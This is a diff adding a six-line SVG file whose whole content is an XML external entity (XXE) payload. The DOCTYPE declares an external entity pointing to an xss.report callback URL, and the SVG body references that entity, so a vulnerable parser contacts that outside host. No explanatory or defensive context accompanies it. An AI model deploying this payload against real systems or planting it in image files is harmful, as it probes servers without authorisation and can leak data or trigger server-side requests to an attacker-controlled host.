@@ -1,0 +1,6 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "https://xss.report/c/sa1tama0">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  &xxe;
+</svg>
